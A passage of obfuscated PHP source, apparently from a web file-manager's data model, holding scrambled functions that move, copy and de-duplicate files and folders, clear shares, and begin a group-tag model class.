$D‹©—Œ‘ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $E¶£•È§‡ˆ = $this->_childrenList($B¥õ¬Œ“ö); $C—â•ß— = array_to_keyvalue($E¶£•È§‡ˆ, $D‹©—Œ‘[33], $D‹©—Œ‘[28]); return $this->fileNameAutoGet($C—â•ß—, $E†ô‘’•™‚, $eãºÄ«‹ç‚, $cªë›ºĞ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($eëÑÜÈ‡Ì°, $F¯©ŒìäåÒ, $B§äËæ÷‡ = REPEAT_REPLACE, $f÷ùõŠ¤Â× = '') { goto e¥É‡—¤½¤; bİ»ÊßáŒ: $f±ÈÚ‚øöÊ = $this->fileNameExistCache($F¯©ŒìäåÒ, $E¬ôÅº‰Ùù[$fÒ­ÑÚ—[28]]); $EİËíáìñ = $this->_move($eëÑÜÈ‡Ì°, $F¯©ŒìäåÒ, $B§äËæ÷‡, $c…©Ë®–ÉÀ, $f÷ùõŠ¤Â×); $this->sourceCacheClear(); goto bØéäƒÊŒì; Eñáùö¨«µ: $this->folderSizeReset($F¯©ŒìäåÒ); $Dß³Ñ°å¾ = array($E¬ôÅº‰Ùù[$fÒ­ÑÚ—[479]], $F¯©ŒìäåÒ); if ($E¬ôÅº‰Ùù[$fÒ­ÑÚ—[388]] == $fÒ­ÑÚ—[86]) { $Dß³Ñ°å¾[] = $eëÑÜÈ‡Ì°; } goto cÂôŞÎ¬î; BÃò‡¡Ëî‘: return $EİËíáìñ; goto C–êˆÆÙÏÙ; EÁ¯ñËÓÀ: if (!$E¬ôÅº‰Ùù || !$Bç°¤¬ïŠ» || $Bç°¤¬ïŠ»[$fÒ­ÑÚ—[388]] != $fÒ­ÑÚ—[86]) { return !1; } Hook::trigger($fÒ­ÑÚ—[547], $b²ËŒ Æ¾Ä); $this->targetIsDelete = intval($E¬ôÅº‰Ùù[$fÒ­ÑÚ—[414]]); goto CßÔâ­Ê‘¯; cÂôŞÎ¬î: $this->updateModifyTime($Dß³Ñ°å¾); Model($fÒ­ÑÚ—[522])->eventMove($eëÑÜÈ‡Ì°, $E¬ôÅº‰Ùù[$fÒ­ÑÚ—[479]], $F¯©ŒìäåÒ); Hook::trigger($fÒ­ÑÚ—[548], $b²ËŒ Æ¾Ä); goto BÃò‡¡Ëî‘; CßÔâ­Ê‘¯: if ($E¬ôÅº‰Ùù[$fÒ­ÑÚ—[479]] == $F¯©ŒìäåÒ && $f÷ùõŠ¤Â× != $E¬ôÅº‰Ùù[$fÒ­ÑÚ—[28]]) { $e×¿ö¡Ò§ = $this->fileNameExist($F¯©ŒìäåÒ, $f÷ùõŠ¤Â×); if ($e×¿ö¡Ò§ && $E¬ôÅº‰Ùù[$fÒ­ÑÚ—[388]] == $fÒ­ÑÚ—[486]) { goto fî¡´„—å”; DƒÉ©õíøø: return $e×¿ö¡Ò§; goto CÎ”›ğá; C²ƒÛÔ²¿ˆ: $this->removeNow($eëÑÜÈ‡Ì°, !1); $this->folderSizeReset($F¯©ŒìäåÒ); Hook::trigger($fÒ­ÑÚ—[548], $b²ËŒ Æ¾Ä); goto DƒÉ©õíøø; fî¡´„—å”: $DÃÕ¨Ì¹• = $this->sourceInfo($e×¿ö¡Ò§); $c¡°˜í›Æ = $this->fileHistory($DÃÕ¨Ì¹•, $E¬ôÅº‰Ùù[$fÒ­ÑÚ—[436]], $E¬ôÅº‰Ùù[$fÒ­ÑÚ—[77]]); if (!$c¡°˜í›Æ) { Model($fÒ­ÑÚ—[439])->remove($E¬ôÅº‰Ùù[$fÒ­ÑÚ—[436]]); } goto C²ƒÛÔ²¿ˆ; CÎ”›ğá: } } $fÈíï«¶Œ = $f÷ùõŠ¤Â× ? $f÷ùõŠ¤Â× : $E¬ôÅº‰Ùù[$fÒ­ÑÚ—[28]]; $this->lockMoveStart($eëÑÜÈ‡Ì°); goto a÷‚‰¢½Ü; e¥É‡—¤½¤: $fÒ­ÑÚ— =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $E¬ôÅº‰Ùù = $this->sourceInfo($eëÑÜÈ‡Ì°); $Bç°¤¬ïŠ» = $this->sourceInfo($F¯©ŒìäåÒ); goto A§Ìå­ĞáŸ; bØéäƒÊŒì: if ($E¬ôÅº‰Ùù[$fÒ­ÑÚ—[388]] == $fÒ­ÑÚ—[86] && $f±ÈÚ‚øöÊ) { $this->folderSizeResetChildren($EİËíáìñ); } Model($fÒ­ÑÚ—[173])->linkAdd($c…©Ë®–ÉÀ[$fÒ­ÑÚ—[518]]); if ($f±ÈÚ‚øöÊ && $c…©Ë®–ÉÀ[$fÒ­ÑÚ—[549]]) { $this->removeNow($eëÑÜÈ‡Ì°, !1); } goto F¢šôš¯Øˆ; a÷‚‰¢½Ü: $this->lockWriteStart($F¯©ŒìäåÒ, $fÈíï«¶Œ); $c…©Ë®–ÉÀ = array($fÒ­ÑÚ—[518] => array(), $fÒ­ÑÚ—[549] => !1); $this->clearShare($eëÑÜÈ‡Ì°, $F¯©ŒìäåÒ); goto bİ»ÊßáŒ; F¢šôš¯Øˆ: $this->lockMoveEnd($eëÑÜÈ‡Ì°); $this->lockWriteEnd($F¯©ŒìäåÒ, $fÈíï«¶Œ); $this->folderSizeReset($E¬ôÅº‰Ùù[$fÒ­ÑÚ—[479]]); goto Eñáùö¨«µ; A§Ìå­ĞáŸ: if ($E¬ôÅº‰Ùù[$fÒ­ÑÚ—[479]] == $Bç°¤¬ïŠ»[$fÒ­ÑÚ—[387]]) { if ($E¬ôÅº‰Ùù[$fÒ­ÑÚ—[414]] == $fÒ­ÑÚ—[86]) { Model($fÒ­ÑÚ—[412])->restore(array($eëÑÜÈ‡Ì°)); } if (!$f÷ùõŠ¤Â× || $f÷ùõŠ¤Â× == $E¬ôÅº‰Ùù[$fÒ­ÑÚ—[28]]) { return $eëÑÜÈ‡Ì°; } } $b²ËŒ Æ¾Ä = $this->pathInfoMore($eëÑÜÈ‡Ì°); if ($this->isParentOf($eëÑÜÈ‡Ì°, $F¯©ŒìäåÒ)) { return !1; } goto EÁ¯ñËÓÀ; C–êˆÆÙÏÙ: } private function _move($DíËßÀ‰¾, $aêÜÃŒÄ±, $eÅãÕ²ÏïŠ, &$aÅí¯¡†ù, $E®¦ÙòøßÈ = '') { goto fŠ˜¡Ø´¦ó; eöÑÉ­ØÇ: $Cêµ®¸Ñºœ = !1; if ($cß‚¶ÚšË‰) { if ($eÅãÕ²ÏïŠ == REPEAT_RENAME_FOLDER) { $dó®’íÊÀê = $this->fileNameAuto($aêÜÃŒÄ±, $dó®’íÊÀê, $eÅãÕ²ÏïŠ, $cß‚¶ÚšË‰); $cÄ¯’ŠùÈè = $this->_moveForce($DíËßÀ‰¾, $aêÜÃŒÄ±, $dó®’íÊÀê); } else { if ($eÅãÕ²ÏïŠ == REPEAT_RENAME_FOLDER) { $eÅãÕ²ÏïŠ = REPEAT_RENAME; } $AÇ¼¸İØ”· = $this->_childrenListSelect($DíËßÀ‰¾); foreach ($AÇ¼¸İØ”· as $d â¸ñ ©ƒ) { $this->_move($d â¸ñ ©ƒ[$eŸáÙ‚…áŒ[387]], $C…‡Œ¨È‹¿, $eÅãÕ²ÏïŠ, $aÅí¯¡†ù); } $Cêµ®¸Ñºœ = !0; } } else { if ($eÅãÕ²ÏïŠ == REPEAT_SKIP) { $Cêµ®¸Ñºœ = !0; } else { if ($eÅãÕ²ÏïŠ == REPEAT_RENAME || $eÅãÕ²ÏïŠ == REPEAT_RENAME_FOLDER) { $dó®’íÊÀê = $this->fileNameAuto($aêÜÃŒÄ±, $dó®’íÊÀê, $eÅãÕ²ÏïŠ, $cß‚¶ÚšË‰); $cÄ¯’ŠùÈè = $this->_moveForce($DíËßÀ‰¾, $aêÜÃŒÄ±, $dó®’íÊÀê); } else { if ($eÅãÕ²ÏïŠ == REPEAT_REPLACE) { $aêõåÑºˆ‚ = $this->sourceInfoCache($C…‡Œ¨È‹¿); $A¸£ˆŸò¬² = $this->fileHistory($aêõåÑºˆ‚, $C®‰×„ªŸá[$eŸáÙ‚…áŒ[436]], $C®‰×„ªŸá[$eŸáÙ‚…áŒ[77]]); if ($A¸£ˆŸò¬²) { $aÅí¯¡†ù[$eŸáÙ‚…áŒ[518]][] = $C®‰×„ªŸá[$eŸáÙ‚…áŒ[436]]; } else { $Cêµ®¸Ñºœ = !0; } } } } } if ($Cêµ®¸Ñºœ && !$aÅí¯¡†ù[$eŸáÙ‚…áŒ[549]]) { $aÅí¯¡†ù[$eŸáÙ‚…áŒ[549]] = !0; } goto AÚ»ÚªïÉ; d”Å¬æê¨î: $this->lockWriteStart($aêÜÃŒÄ±, $dó®’íÊÀê); if (!$C…‡Œ¨È‹¿) { return $this->_moveForce($DíËßÀ‰¾, $aêÜÃŒÄ±, $dó®’íÊÀê); } $cÄ¯’ŠùÈè = $C…‡Œ¨È‹¿; goto eöÑÉ­ØÇ; fŠ˜¡Ø´¦ó: $eŸáÙ‚…áŒ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $C®‰×„ªŸá = $this->sourceInfo($DíËßÀ‰¾); $cß‚¶ÚšË‰ = $C®‰×„ªŸá[$eŸáÙ‚…áŒ[388]] == $eŸáÙ‚…áŒ[86]; goto EÛ½÷ÛŞÃ¢; AÚ»ÚªïÉ: return $cÄ¯’ŠùÈè; goto bÊ…‘ñÀ½; EÛ½÷ÛŞÃ¢: $dó®’íÊÀê = $E®¦ÙòøßÈ ? $E®¦ÙòøßÈ : $C®‰×„ªŸá[$eŸáÙ‚…áŒ[28]]; $C…‡Œ¨È‹¿ = $this->fileNameExistCache($aêÜÃŒÄ±, $dó®’íÊÀê); $this->lockMoveStart($DíËßÀ‰¾); goto d”Å¬æê¨î; bÊ…‘ñÀ½: } private function _moveForce($cØª¦°¢‡, $CŸ¬¯øÀ¦©, $f¥¬ìùˆ§Ğ) { goto bº“´ÁÙ¸æ; bº“´ÁÙ¸æ: $FĞ¶ÙÁ§ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B¯óòÊŞ = $this->sourceInfo($cØª¦°¢‡); $A…ò¥¥‘Ä = $this->sourceInfo($CŸ¬¯øÀ¦©); goto a‘ùˆé“’î; a‘ùˆé“’î: $d¶Ä¦†â”œ = $B¯óòÊŞ[$FĞ¶ÙÁ§[388]] == $FĞ¶ÙÁ§[86]; $E—‰„Ú‚ôŒ = array($FĞ¶ÙÁ§[386] => $A…ò¥¥‘Ä[$FĞ¶ÙÁ§[387]], $FĞ¶ÙÁ§[542] => $A…ò¥¥‘Ä[$FĞ¶ÙÁ§[477]] . $A…ò¥¥‘Ä[$FĞ¶ÙÁ§[387]] . $FĞ¶ÙÁ§[47], $FĞ¶ÙÁ§[538] => $A…ò¥¥‘Ä[$FĞ¶ÙÁ§[389]], $FĞ¶ÙÁ§[539] => $A…ò¥¥‘Ä[$FĞ¶ÙÁ§[474]], $FĞ¶ÙÁ§[541] => USER_ID, $FĞ¶ÙÁ§[404] => $f¥¬ìùˆ§Ğ); $D¥Ú­‰ğÊÔ = $B¯óòÊŞ[$FĞ¶ÙÁ§[389]] == SourceModel::TYPE_GROUP && $A…ò¥¥‘Ä[$FĞ¶ÙÁ§[389]] == SourceModel::TYPE_GROUP && $B¯óòÊŞ[$FĞ¶ÙÁ§[474]] == $A…ò¥¥‘Ä[$FĞ¶ÙÁ§[474]]; goto aØÎíÇ¬­”; aŠàîÚ°”ƒ: if ($d¶Ä¦†â”œ) { $d‹®›™¼é¶ = array($FĞ¶ÙÁ§[542] => array($FĞ¶ÙÁ§[501], $B¯óòÊŞ[$FĞ¶ÙÁ§[477]] . $B¯óòÊŞ[$FĞ¶ÙÁ§[387]] . $FĞ¶ÙÁ§[502])); $A¸äà¹ªŞÛ = $B¯óòÊŞ[$FĞ¶ÙÁ§[477]] . $B¯óòÊŞ[$FĞ¶ÙÁ§[387]] . $FĞ¶ÙÁ§[47]; $b½ğŒë†‚’ = $A…ò¥¥‘Ä[$FĞ¶ÙÁ§[477]] . $A…ò¥¥‘Ä[$FĞ¶ÙÁ§[387]] . $FĞ¶ÙÁ§[47] . $B¯óòÊŞ[$FĞ¶ÙÁ§[387]] . $FĞ¶ÙÁ§[47]; $D‰‚‹¡™èƒ = array($FĞ¶ÙÁ§[542] => array($FĞ¶ÙÁ§[550], "\162\x65\160\154\x61\x63\x65\50\x70\x61\162\145\156\x74\114\x65\166\x65\154\x2c\x27{$A¸äà¹ªŞÛ}\x27\54\x27{$b½ğŒë†‚’}\47\51"), $FĞ¶ÙÁ§[538] => $A…ò¥¥‘Ä[$FĞ¶ÙÁ§[389]], $FĞ¶ÙÁ§[539] => $A…ò¥¥‘Ä[$FĞ¶ÙÁ§[474]]); if ($C¿ÏñÂÄŸÇ) { $D‰‚‹¡™èƒ[$FĞ¶ÙÁ§[413]] = 0; } $this->where($d‹®›™¼é¶)->data($D‰‚‹¡™èƒ)->save(); } $this->where(array($FĞ¶ÙÁ§[401] => $cØª¦°¢‡))->data($E—‰„Ú‚ôŒ)->save(); return $cØª¦°¢‡; goto fÕØÌ±°¹ã; aØÎíÇ¬­”: if (!$D¥Ú­‰ğÊÔ) { Model($FĞ¶ÙÁ§[472])->authClear($cØª¦°¢‡); } $C¿ÏñÂÄŸÇ = $B¯óòÊŞ[$FĞ¶ÙÁ§[414]] == $FĞ¶ÙÁ§[86] && $A…ò¥¥‘Ä[$FĞ¶ÙÁ§[414]] != $FĞ¶ÙÁ§[86]; if ($C¿ÏñÂÄŸÇ) { $E—‰„Ú‚ôŒ[$FĞ¶ÙÁ§[413]] = 0; } goto aŠàîÚ°”ƒ; fÕØÌ±°¹ã: } private function clearShare($dÏŞŠšÒ¡ , $f‘õæß¤½…) { goto CæÑó˜‚Œ; aŸ÷óåŠŒÒ: if ($eòÕÑ§øå‡[$A²‡®ê¬œ[474]] == $b˜¢ÄÔ¿Ê…[$A²‡®ê¬œ[474]] && $eòÕÑ§øå‡[$A²‡®ê¬œ[389]] == $A²‡®ê¬œ[551]) { return; } $dÉÔ»­ìØÅ = array($A²‡®ê¬œ[477] => array($A²‡®ê¬œ[501], $eòÕÑ§øå‡[$A²‡®ê¬œ[477]] . $dÏŞŠšÒ¡  . $A²‡®ê¬œ[502])); $D°¤ÃâªƒÎ = $this->field($A²‡®ê¬œ[401])->where($dÉÔ»­ìØÅ)->getField($A²‡®ê¬œ[387], !0); goto CÆñëòÍËÈ; F‹®‚Öˆ£è: Model($A²‡®ê¬œ[552])->where($dÉÔ»­ìØÅ)->save(array($A²‡®ê¬œ[464] => 0)); Model($A²‡®ê¬œ[553])->where($dÉÔ»­ìØÅ)->delete(); goto a¯»´ˆ°ã“; Fµ¼Ö²àğ: if (!$a†ìë“Ö£É) { return; } $a†ìë“Ö£É = array_to_keyvalue($a†ìë“Ö£É, $A²‡®ê¬œ[33], $A²‡®ê¬œ[457]); $dÉÔ»­ìØÅ = array($A²‡®ê¬œ[457] => array($A²‡®ê¬œ[7], $a†ìë“Ö£É)); goto F‹®‚Öˆ£è; CÆñëòÍËÈ: if (!$D°¤ÃâªƒÎ) { return; } $dÉÔ»­ìØÅ = array($A²‡®ê¬œ[387] => array($A²‡®ê¬œ[7], $D°¤ÃâªƒÎ), $A²‡®ê¬œ[464] => 1); $a†ìë“Ö£É = Model($A²‡®ê¬œ[552])->field($A²‡®ê¬œ[457])->where($dÉÔ»­ìØÅ)->select(); goto Fµ¼Ö²àğ; CæÑó˜‚Œ: $A²‡®ê¬œ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eòÕÑ§øå‡ = $this->sourceInfo($dÏŞŠšÒ¡ ); $b˜¢ÄÔ¿Ê… = $this->sourceInfo($f‘õæß¤½…); goto aŸ÷óåŠŒÒ; a¯»´ˆ°ã“: } public function copyFolderFromIO($Eñå¬Ó¿è½, $b© ­Åó†«, $f‰¥…»ºÌâ, $bİğµ‹ñ­ë, $A÷”×áŒ, $E©ĞÅ·…Ç = false) { goto DÕÇæäâ; D÷¡ë­ó†¢: Model($BÏæ³àî¡[521])->addAll($b·¨µ’›ŸÈ[$BÏæ³àî¡[519]], array(), !0); Model($BÏæ³àî¡[522])->eventCopy($eÅŒŠ„Ò»©); $this->saveAll($b·¨µ’›ŸÈ[$BÏæ³àî¡[520]]); goto a¼¦šÃÇ¶; a¼¦šÃÇ¶: Model($BÏæ³àî¡[439])->linkAdd($b·¨µ’›ŸÈ[$BÏæ³àî¡[518]]); Model($BÏæ³àî¡[439])->remove($b·¨µ’›ŸÈ[$BÏæ³àî¡[554]]); $this->folderSizeReset($f‰¥…»ºÌâ); goto bè¸”àİå; DÕÇæäâ: $BÏæ³àî¡ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $b·¨µ’›ŸÈ = array($BÏæ³àî¡[519] => array(), $BÏæ³àî¡[520] => array(), $BÏæ³àî¡[518] => array(), $BÏæ³àî¡[554] => array()); $E¯ö¿·Íø£ = $E©ĞÅ·…Ç ? $E©ĞÅ·…Ç : $Eñå¬Ó¿è½->pathThis($b© ­Åó†«); goto fŒˆ’‹ÙÂ; bè¸”àİå: $this->updateModifyTime($f‰¥…»ºÌâ); return $eÅŒŠ„Ò»©; goto cßí¾ÊµÇİ; fŒˆ’‹ÙÂ: $BÀ‰“â“Ï = $this->fileNameExist($f‰¥…»ºÌâ, $E¯ö¿·Íø£); $eÅŒŠ„Ò»© = $this->mkdir($f‰¥…»ºÌâ, $E¯ö¿·Íø£, $bİğµ‹ñ­ë); if (!$BÀ‰“â“Ï || $bİğµ‹ñ­ë == REPEAT_RENAME_FOLDER) { $bİğµ‹ñ­ë = !1; } goto dŠ¸Â‘´§; dŠ¸Â‘´§: if ($BÀ‰“â“Ï) { $this->_childrenAllMake($BÀ‰“â“Ï); } Hook::trigger($BÏæ³àî¡[555]); $this->_copyChildTo($Eñå¬Ó¿è½, $b© ­Åó†«, $eÅŒŠ„Ò»©, $bİğµ‹ñ­ë, $b·¨µ’›ŸÈ, $A÷”×áŒ); goto FÂô¤ŸÖ­¾; FÂô¤ŸÖ­¾: Hook::trigger($BÏæ³àî¡[556]); if ($eÅŒŠ„Ò»©) { $this->folderSizeResetChildren($eÅŒŠ„Ò»©); } $this->_childrenListClear(); goto D÷¡ë­ó†¢; cßí¾ÊµÇİ: } private function _copyChildTo($CÔŞ³ŠŒ¿, $eÓøÇŠº½´, $dÂ½äëÀÏš, $FÒèç›”, &$eÎÑ‚‘™êá, $D—™íÖ×Ç‹) { goto D‰ÓŸÇĞ¹Õ; BÁ†¢–Õå†: foreach ($aºê²ùÍ¦ as &$D¨½ÌòÜ×) { goto e£Ê¿Ñ¶œ; B¬ç¼™§»‰: if ($FÒèç›”) { $C‡›áïÛÃ™ = $this->fileNameExistCache($dÂ½äëÀÏš, $D¨½ÌòÜ×[$FŠ§°¦¿¾[28]]); if ($C‡›áïÛÃ™) { if ($D¨½ÌòÜ×[$FŠ§°¦¿¾[388]] || $FÒèç›” == REPEAT_SKIP) { continue; } if ($FÒèç›” == REPEAT_REPLACE) { $E‹‰®šŸÛ§ = $this->sourceInfoCache($C‡›áïÛÃ™); $BÓèÏÏ“­ = $this->fileHistory($E‹‰®šŸÛ§, $D¨½ÌòÜ×[$FŠ§°¦¿¾[436]], $D¨½ÌòÜ×[$FŠ§°¦¿¾[77]]); if ($BÓèÏÏ“­) { $eÎÑ‚‘™êá[$FŠ§°¦¿¾[518]][] = $D¨½ÌòÜ×[$FŠ§°¦¿¾[436]]; } continue; } else { if ($FÒèç›” == REPEAT_RENAME) { $D¨½ÌòÜ×[$FŠ§°¦¿¾[28]] = $this->fileNameAutoCache($dÂ½äëÀÏš, $D¨½ÌòÜ×[$FŠ§°¦¿¾[28]], $FÒèç›”, !1); } } } } if (!$D¨½ÌòÜ×[$FŠ§°¦¿¾[388]] && $D¨½ÌòÜ×[$FŠ§°¦¿¾[436]]) { $eÎÑ‚‘™êá[$FŠ§°¦¿¾[518]][] = $D¨½ÌòÜ×[$FŠ§°¦¿¾[436]]; } $DÑ–¹[] = $this->_makeItemData($D¨½ÌòÜ×, $c¨‡¯¬á, $D¨½ÌòÜ×[$FŠ§°¦¿¾[28]]); goto aÄ¤©ë—ÜØ; e£Ê¿Ñ¶œ: if (isset($Dé¯œ¡ŠÑ[$D¨½ÌòÜ×[$FŠ§°¦¿¾[28]]])) { $D¨½ÌòÜ× = $Dé¯œ¡ŠÑ[$D¨½ÌòÜ×[$FŠ§°¦¿¾[28]]]; } $D¨½ÌòÜ×[$FŠ§°¦¿¾[388]] = $D¨½ÌòÜ×[$FŠ§°¦¿¾[29]] == $FŠ§°¦¿¾[76]; $D¨½ÌòÜ×[$FŠ§°¦¿¾[390]] = _get($D¨½ÌòÜ×, $FŠ§°¦¿¾[167], $FŠ§°¦¿¾[33]); goto BÅÌ—óä…İ; BÅÌ—óä…İ: $D¨½ÌòÜ×[$FŠ§°¦¿¾[77]] = _get($D¨½ÌòÜ×, $FŠ§°¦¿¾[77], 0); $D¨½ÌòÜ×[$FŠ§°¦¿¾[436]] = _get($D¨½ÌòÜ×, $FŠ§°¦¿¾[436], 0); if (!isset($D¨½ÌòÜ×[$FŠ§°¦¿¾[557]]) && $D¨½ÌòÜ×[$FŠ§°¦¿¾[436]]) { $eÎÑ‚‘™êá[$FŠ§°¦¿¾[554]][] = $D¨½ÌòÜ×[$FŠ§°¦¿¾[436]]; } goto B¬ç¼™§»‰; aÄ¤©ë—ÜØ: } unset($D¨½ÌòÜ×); if (!empty($DÑ–¹)) { $this->addAll($DÑ–¹); $this->_childrenListSelect($dÂ½äëÀÏš); } goto eç½Óêï— ; eç½Óêï— : $d°†ïª“Ë” = $this->_childrenList($dÂ½äëÀÏš); $d°†ïª“Ë” = array_to_keyvalue($d°†ïª“Ë”, $FŠ§°¦¿¾[28]); foreach ($aºê²ùÍ¦ as $D¨½ÌòÜ×) { $E‹‰®šŸÛ§ = $d°†ïª“Ë”[$D¨½ÌòÜ×[$FŠ§°¦¿¾[28]]]; $a×¨£Ğ»äÙ = $E‹‰®šŸÛ§[$FŠ§°¦¿¾[387]]; $this->_copyApplyMeta($E‹‰®šŸÛ§, $eÎÑ‚‘™êá); if ($D¨½ÌòÜ×[$FŠ§°¦¿¾[29]] == $FŠ§°¦¿¾[76]) { $D¨½ÌòÜ×[$FŠ§°¦¿¾[75]] = $CÔŞ³ŠŒ¿->getPathInner($D¨½ÌòÜ×[$FŠ§°¦¿¾[75]]); $this->_copyChildTo($CÔŞ³ŠŒ¿, $D¨½ÌòÜ×[$FŠ§°¦¿¾[75]], $a×¨£Ğ»äÙ, $FÒèç›”, $eÎÑ‚‘™êá, $D—™íÖ×Ç‹); } } goto FõÀÕ·ÌÒ; Dèäë¶“—‘: $aºê²ùÍ¦ = array_merge($Cãô½­Û°Ã[$FŠ§°¦¿¾[73]], $Cãô½­Û°Ã[$FŠ§°¦¿¾[74]]); $Dé¯œ¡ŠÑ = $this->_addFiles($CÔŞ³ŠŒ¿, $Cãô½­Û°Ã[$FŠ§°¦¿¾[73]], $D—™íÖ×Ç‹); $DÑ–¹ = array(); goto BÁ†¢–Õå†; D‰ÓŸÇĞ¹Õ: $FŠ§°¦¿¾ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c¨‡¯¬á = $this->sourceInfoCache($dÂ½äëÀÏš); $Cãô½­Û°Ã = $CÔŞ³ŠŒ¿->listPath($eÓøÇŠº½´); goto Dèäë¶“—‘; FõÀÕ·ÌÒ: } private function _addFiles($AÎ—ĞÃ‡ªà, $CİïËŒ—Ëˆ, $A¸¬š£íÈô) { goto F™ï¡¿¿Á; aò£æäˆ¦ß: $a¥º¨µ–«->addAll($B’öæÕ¢ğí); $aø”†ˆğÆĞ = array($EØ ñÖáïŞ[169] => array($EØ ñÖáïŞ[7], array_keys($FôøàõÙ‡))); $AªÙÕØèÈ‰ = $a¥º¨µ–«->where($aø”†ˆğÆĞ)->select(); goto F¨œÆœÏáö; a¤ÛÉ»¢´¥: foreach ($CİïËŒ—Ëˆ as &$Bù¤ãĞäôƒ) { goto dÍƒâ·«²—; EŠ‚‚˜ñÅ‹: $Bù¤ãĞäôƒ[$EØ ñÖáïŞ[169]] = $A—©Ö‚—†ª; Hook::trigger($EØ ñÖáïŞ[559], $Bù¤ãĞäôƒ); $FôøàõÙ‡[$A—©Ö‚—†ª][] =& $Bù¤ãĞäôƒ; goto F³ÈÈ—×Ä; F³ÈÈ—×Ä: if (count($FôøàõÙ‡[$A—©Ö‚—†ª]) > 1) { $Bù¤ãĞäôƒ[$EØ ñÖáïŞ[557]] = !0; } goto bÚ¿Ş²ñ·ë; dÍƒâ·«²—: Hook::trigger($EØ ñÖáïŞ[558], $Bù¤ãĞäôƒ); $Bù¤ãĞäôƒ[$EØ ñÖáïŞ[75]] = $AÎ—ĞÃ‡ªà->getPathInner($Bù¤ãĞäôƒ[$EØ ñÖáïŞ[75]]); $aèºÕƒÏÌµ = $AÎ—ĞÃ‡ªà->hashSimple($Bù¤ãĞäôƒ[$EØ ñÖáïŞ[75]]); goto A¨İĞåÊ“; A¨İĞåÊ“: $A—©Ö‚—†ª = $AÎ—ĞÃ‡ªà->hashMd5($Bù¤ãĞäôƒ[$EØ ñÖáïŞ[75]]); if (strlen($A—©Ö‚—†ª) > 10 && !isset($FôøàõÙ‡[$A—©Ö‚—†ª])) { $FôøàõÙ‡[$A—©Ö‚—†ª] = array(); } $Bù¤ãĞäôƒ[$EØ ñÖáïŞ[170]] = $aèºÕƒÏÌµ; goto EŠ‚‚˜ñÅ‹; bÚ¿Ş²ñ·ë: } unset($Bù¤ãĞäôƒ); $aø”†ˆğÆĞ = array($EØ ñÖáïŞ[169] => array($EØ ñÖáïŞ[7], array_keys($FôøàõÙ‡))); goto F•·§à´¶ö; F¨œÆœÏáö: $AªÙÕØèÈ‰ = $AªÙÕØèÈ‰ ? $AªÙÕØèÈ‰ : array(); foreach ($AªÙÕØèÈ‰ as $d³°±†‡«Â) { if (!isset($FôøàõÙ‡[$d³°±†‡«Â[$EØ ñÖáïŞ[169]]])) { continue; } $c»ëÜ–šäê =& $FôøàõÙ‡[$d³°±†‡«Â[$EØ ñÖáïŞ[169]]]; foreach ($c»ëÜ–šäê as &$Bù¤ãĞäôƒ) { $Bù¤ãĞäôƒ[$EØ ñÖáïŞ[436]] = $d³°±†‡«Â[$EØ ñÖáïŞ[436]]; } unset($Bù¤ãĞäôƒ); } $bÕáÇ¶ƒ§ = array(); goto D‹›œÏ¢¹; F•·§à´¶ö: $a¥º¨µ–« = Model($EØ ñÖáïŞ[560]); $AªÙÕØèÈ‰ = $a¥º¨µ–«->where($aø”†ˆğÆĞ)->select(); $AªÙÕØèÈ‰ = $AªÙÕØèÈ‰ ? $AªÙÕØèÈ‰ : array(); goto cÚ‰ŸÇ³×Ö; cÚ‰ŸÇ³×Ö: foreach ($AªÙÕØèÈ‰ as $d³°±†‡«Â) { if (!isset($FôøàõÙ‡[$d³°±†‡«Â[$EØ ñÖáïŞ[169]]])) { continue; } $eô¿Ğ†é… = $FôøàõÙ‡[$d³°±†‡«Â[$EØ ñÖáïŞ[169]]]; foreach ($eô¿Ğ†é… as &$Bù¤ãĞäôƒ) { $Bù¤ãĞäôƒ[$EØ ñÖáïŞ[436]] = $d³°±†‡«Â[$EØ ñÖáïŞ[436]]; $Bù¤ãĞäôƒ[$EØ ñÖáïŞ[557]] = !0; } unset($Bù¤ãĞäôƒ); } $B’öæÕ¢ğí = array(); foreach ($CİïËŒ—Ëˆ as $Dôºç‰Í–¯) { if (isset($Dôºç‰Í–¯[$EØ ñÖáïŞ[557]]) && $Dôºç‰Í–¯[$EØ ñÖáïŞ[557]]) { continue; } $dµÄ”Ü°»‘ = $AÎ—ĞÃ‡ªà->getPathInner($Dôºç‰Í–¯[$EØ ñÖáïŞ[75]]); $f¢ÔÕÇĞË¿ = $a¥º¨µ–«->addFileMake($dµÄ”Ü°»‘, $Dôºç‰Í–¯[$EØ ñÖáïŞ[77]], $Dôºç‰Í–¯[$EØ ñÖáïŞ[170]], $Dôºç‰Í–¯[$EØ ñÖáïŞ[169]], $Dôºç‰Í–¯[$EØ ñÖáïŞ[28]], $A¸¬š£íÈô); $B’öæÕ¢ğí[] = $f¢ÔÕÇĞË¿; } goto aò£æäˆ¦ß; D‹›œÏ¢¹: foreach ($CİïËŒ—Ëˆ as $EŒˆÃ—†²å) { $bÕáÇ¶ƒ§[$EŒˆÃ—†²å[$EØ ñÖáïŞ[28]]] = $EŒˆÃ—†²å; } return $bÕáÇ¶ƒ§; goto AßŸÖÁŒœÎ; F™ï¡¿¿Á: $EØ ñÖáïŞ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$CİïËŒ—Ëˆ || count($CİïËŒ—Ëˆ) == 0) { return array(); } $FôøàõÙ‡ = array(); goto a¤ÛÉ»¢´¥; AßŸÖÁŒœÎ: } } define($_SERVER[ó¬â¥‰ÊÔ¤Ç£][561], $_SERVER[ó¬â¥‰ÊÔ¤Ç£][562]); goto cà†Å¿÷Ç; bÔËÓ«†÷…: class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\145\x72\x5f\146\141\x76"; protected function cacheFunctionAlias($bì²ØËŸ) { $d¡íÛ¬Áö… =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; return array($d¡íÛ¬Áö…[1736] => array($bì²ØËŸ[0], $d¡íÛ¬Áö…[1737]), $d¡íÛ¬Áö…[1738] => array($bì²ØËŸ[0], $d¡íÛ¬Áö…[1739])); } protected function get($b¹•ëÎ©¦) { $B©é”èíáê =& 